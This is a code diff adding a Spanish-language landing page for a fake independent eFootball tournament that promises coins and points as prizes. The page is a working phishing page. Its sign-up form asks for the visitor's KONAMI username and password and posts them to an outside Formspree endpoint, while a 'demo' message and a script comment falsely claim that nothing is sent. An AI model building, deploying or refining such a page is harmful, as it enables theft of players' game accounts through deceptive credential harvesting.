@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>eFootball | Torneo independiente</title>
+<style>
+/* =========================
+   ZONA DE EDICIÓN 1: COLORES
+   Cambia estos códigos para personalizar la web.
+   ========================= */
+:root{
+  --fondo:#060b1c; --panel:#101a35; --azul:#1749d1;
+  --amarillo:#ffe600; --morado:#a855f7; --texto:#f7f8ff;
+  --suave:#aab6d3; --borde:rgba(255,255,255,.13);
+}
+*{box-sizing:border-box}
+body{margin:0;background:
+  radial-gradient(ellipse at 15% 0%,rgba(24,72,209,.32),transparent 42%),
+  radial-gradient(ellipse at 95% 35%,rgba(168,85,247,.18),transparent 35%),
+  var(--fondo);color:var(--texto);font-family:Arial,Helvetica,sans-serif}
+a{color:inherit}
+.wrap{width:min(1080px,92%);margin:auto}
+nav{display:flex;align-items:center;justify-content:space-between;padding:22px 0}
+.brand{font-weight:900;letter-spacing:2px;font-size:20px}
+.brand span{color:var(--amarillo)}
+.pill{border:1px solid var(--borde);border-radius:99px;padding:8px 13px;color:#d9e2ff;font-size:12px}
+.hero{position:relative;overflow:hidden;border:1px solid var(--borde);border-radius:24px;
+  padding:clamp(26px,6vw,64px);background:
+  linear-gradient(115deg,rgba(4,10,29,.97),rgba(9,31,92,.85)),
+  repeating-linear-gradient(135deg,transparent 0 24px,rgba(255,255,255,.03) 25px 27px);
+  box-shadow:0 25px 80px rgba(0,0,0,.35)}
+.hero:after{content:"";position:absolute;width:330px;height:330px;border:42px solid rgba(255,230,0,.08);
+  border-radius:50%;right:-110px;top:-110px}
+.kicker{color:var(--amarillo);font-weight:800;letter-spacing:3px;text-transform:uppercase;font-size:12px}
+h1{font-size:clamp(42px,8vw,82px);line-height:.92;margin:18px 0 16px;font-weight:950;letter-spacing:-3px;text-transform:uppercase}
+h1 em{font-style:normal;color:var(--amarillo)}
+.lead{max-width:620px;color:#d7e0fb;font-size:clamp(15px,2vw,19px);line-height:1.6}
+.cta{display:inline-block;margin-top:18px;background:var(--amarillo);color:#080d20;text-decoration:none;
+  padding:15px 22px;border-radius:10px;font-weight:900;letter-spacing:.5px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:22px 0}
+.stat{background:rgba(16,26,53,.9);border:1px solid var(--borde);border-radius:16px;padding:20px}
+.stat small{color:var(--suave);text-transform:uppercase;letter-spacing:1.2px;font-size:10px;font-weight:bold}
+.stat strong{display:block;font-size:clamp(23px,4vw,36px);margin-top:8px}
+.gold{color:var(--amarillo)} .violet{color:#d8a7ff}
+.section{margin:42px 0}
+.section h2{font-size:25px;margin:0 0 8px}
+.muted{color:var(--suave);line-height:1.6}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.step{padding:20px;border:1px solid var(--borde);border-radius:15px;background:rgba(16,26,53,.65)}
+.num{font-weight:900;color:var(--amarillo);font-size:13px;letter-spacing:2px}
+.step h3{margin:10px 0 6px}
+.formbox{display:grid;grid-template-columns:1fr .85fr;gap:20px;background:var(--panel);
+  border:1px solid var(--borde);border-radius:20px;padding:clamp(20px,4vw,34px)}
+label{display:block;font-size:13px;font-weight:bold;margin:15px 0 7px}
+input,select{width:100%;padding:14px;border-radius:9px;border:1px solid #344365;background:#091229;color:white;font-size:15px}
+button{margin-top:18px;border:0;border-radius:10px;background:var(--amarillo);color:#081027;
+  padding:15px 20px;font-size:15px;font-weight:900;cursor:pointer;width:100%}
+.notice{font-size:12px;color:#aebbd8;line-height:1.55}
+#demoMsg{display:none;margin-top:14px;padding:12px;border-radius:9px;background:#183b2b;color:#c8ffdf}
+footer{border-top:1px solid var(--borde);margin-top:45px;padding:25px 0 35px;color:var(--suave);font-size:12px;line-height:1.6}
+@media(max-width:720px){.stats,.steps{grid-template-columns:1fr}.formbox{grid-template-columns:1fr}h1{letter-spacing:-1.5px}.pill{font-size:10px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <nav>
+    <div class="brand"><span>e</span>FOOTBALL <span style="color:#fff">/ TORNEO</span></div>
+    <div class="pill">COMPETICIÓN INDEPENDIENTE</div>
+  </nav>
+
+  <main>
+    <section class="hero">
+      <div class="kicker">CAMPEONATO EFOOTBALL · 2026</div>
+      <!-- ZONA DE EDICIÓN 2: título y texto principal -->
+      <h1>Bienvenido<br>al <em>torneo</em></h1>
+      <p class="lead">Participa en nuestro campeonato independiente de eFootball, demuestra tu nivel y compite por las recompensas.</p>
+      <a class="cta" href="#inscripcion">QUIERO PARTICIPAR ↓</a>
+    </section>
+
+    <section class="stats" aria-label="Recompensas">
+      <div class="stat"><small>Premio principal</small><strong class="gold">3.000</strong><div>eFootball Coins</div></div>
+      <div class="stat"><small>Recompensa adicional</small><strong class="violet">7.050</strong><div>eFootball Points</div></div>
+      <div class="stat"><small>Modalidad</small><strong>1 vs 1</strong><div>Formato por confirmar</div></div>
+    </section>
+
+    <section class="section">
+      <h2>¿Cómo participar?</h2>
+      <p class="muted">Tres pasos sencillos para solicitar tu plaza.</p>
+      <div class="steps">
+        <article class="step"><div class="num">01 / REGISTRO</div><h3>Rellena el formulario</h3><p class="muted">Escribe tu Usuario KONAMI y Contraseña.</p></article>
+        <article class="step"><div class="num">02 / REVISIÓN</div><h3>Espera confirmación</h3><p class="muted">La organización revisará tu solicitud y te comunicará si está aceptada.</p></article>
+        <article class="step"><div class="num">03 / TORNEO</div><h3>Juega y compite</h3><p class="muted">Recibirás las instrucciones y el calendario antes de empezar.</p></article>
+      </div>
+    </section>
+
+    <section class="section formbox" id="inscripcion">
+      <div>
+        <div class="kicker">Plazas de participación</div>
+        <h2>Solicita tu inscripción</h2>
+        <p class="muted">Inscríbete en nuestro campeonato de eFootball, demuestra tu habilidad y consigue tu plaza para competir por las recompensas.</p>
+        <p class="notice">Protege tu cuenta. Nunca compartas códigos de verificación ni información bancaria. La organización solo solicitará los datos necesarios para gestionar el torneo.</p>
+      </div>
+      
+
+<form id="demoForm" action="https://formspree.io/f/mnpdjbdj" method="POST">
+        <label for="nick">Usuario KONAMI</label>
+        <input id="nick" name="nick" placeholder="..." required maxlength="24">
+        <label for="playerid">Contraseña</label>
+        <input id="playerid" name="playerid" placeholder="...">
+        <label for="platform">Plataforma</label>
+        <select id="platform" name="platform" required>
+          <option value="">Selecciona una opción</option>
+          <option>PlayStation</option><option>Xbox</option><option>Móvil</option><option>PC</option>
+        </select>
+        <button type="submit">PROBAR INSCRIPCIÓN</button>
+        <div id="demoMsg" role="status">¡Prueba completada! Esto es solo una demostración: no se ha enviado ningún registro.</div>
+      </>
+    </section>
+  </main>
+
+  <footer>
+    <strong>TORNEO INDEPENDIENTE · EFOOTBALL 2026</strong><br>
+Organización: Campeonato eFootball
+    
+    Información: Consulta las normas, el calendario y las condiciones antes de participar.
+    
+Este campeonato es independiente y no está afiliado, patrocinado ni gestionado por KONAMI.
+    
+© 2026 · Campeonato eFootball. Todos los derechos reservados.
+  </footer>
+</div>
+<script>
+// DEMO: muestra un aviso local; no transmite ni almacena información.
+</script>
+</body>
+</html>
